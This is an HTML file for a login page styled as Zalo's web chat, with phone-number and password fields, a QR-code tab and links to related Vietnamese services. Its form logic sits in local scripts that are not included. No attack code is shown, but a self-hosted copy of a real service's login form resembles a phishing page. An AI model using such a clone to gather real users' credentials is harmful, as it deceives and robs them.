<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/style.css">
  <script src="https://kit.fontawesome.com/b4b333d1e6.js"></script>
  
  <title>Login</title>
</head>

<body>
  <div class="wrapper-page">
    <div class="layout-login">
      <div class="header">
        <h1><a class="logo" style="cursor: auto;"></a></h1>
        <h2 id="chLocalize1"></h2>
        <h2 class="custom_app_me"><b>chat.zalo.me</b></h2>
      </div>

      <div class="body">
        <div>
          <div class="body-container">
            <div>
              <div class="tabs">
                <ul>
                  <li class="tabs-li-1"><a class="tabs-a-1 active" href="#" id="chLocalize2"></a></li>
                  <li class="tabs-li-2"><a class="tabs-a-2" href="#" id="chLocalize3"></a></li>
                </ul>
              </div>
              <div class="content">
                <div>
                  <div class="animated" style="margin-top: 0px;">
                    <div  id="tabs-div-1" class="form-singin">
                      <div class="animated">
                        <div class="line-form has-ico has-flag">
                          <div>
                            <i class="fa fa-mobile"></i>
                            <div class="select-flag">
                              <span class="tf">+84</span>
                              <div class="select-drow hidden">
                                <!-- <div class="select-items">
                                  <span>A</span>
                                  <span>VN</span>
                                  <span>+83</span>
                                </div>  -->
                                
                              </div>
                            </div>
                          </div>
                          <input tabindex="1" id="input-phone" name="phone-number" type="tel" placeholder="Số điện thoại" autocomplete="off" class="input">
                        </div>
                        <div class="line-form has-ico">
                          <i class="fa fa-lock"></i>
                          <input tabindex="2" id="pass" type="password" placeholder="Mật khẩu" autocomplete="off">
                        </div>
                        <div class="button-form">
                          <a tabindex="3" class="btn btn2 block showbt1 disabled" id="chLocalize4"></a>
                          <div class="btn-more">
                            <a tabindex="4" class="btn btn-default btn-rq btn2 showbt2 disabled" id="chLocalize5" href="#!"></a>
                            <span id="chLocalize7" class="btn2-mess show-bt2"></span>
                            <div class="forget-pass">
                              <a href="#" style="margin: 0px auto; overflow: hidden; white-space: nowrap;" id="chLocalize6"></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div id="tabs-div-2" class="form-singin qr-none" style="min-height: 306px;">
                      MÃ CODE QR
                    </div>
                  </div>
                </div>
              </div>
              
            </div>
          </div>
          
          <div>
            <p class="action-more" id="chLocalize8">
              <a href="" id="chLocalize9"></a>
            </p>
          </div>
        </div>
      </div>
      <div class="footer">
        <p class="select-lang">
          <a class="lang langVie langBold" href="#" >Tiếng Việt</a>
          <a class="lang langEng" href="#" >English</a>
        </p>
        <p id="chLocalize10"></p>
        <div class="logos">
          <ul>
            <li><a href="http://zalo.me" target="_blank" class="logo-zalo"><i class="logo-zalo">Zalo</i></a></li>
            <li><a href="http://mp3.zing.vn" target="_blank" class="logo-zingmp3"><i class="logo-zingmp3">ZingMp3</i></a></li>
            <li><a href="http://tv.zing.vn" target="_blank" class="logo-zingtv"><i class="logo-zingtv">ZingTV</i></a></li>
            <li><a href="http://zing.vn" target="_blank" class="logo-zing"><i class="logo-zing">Zing</i></a></li>
            <li><a href="http://baomoi.com" target="_blank" class="logo-baomoi"><i class="logo-baomoi">Baomoi</i></a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>
  <script src="./js/login.js"></script>
  <script src="./js/localize.js"></script>
</body>

</html>
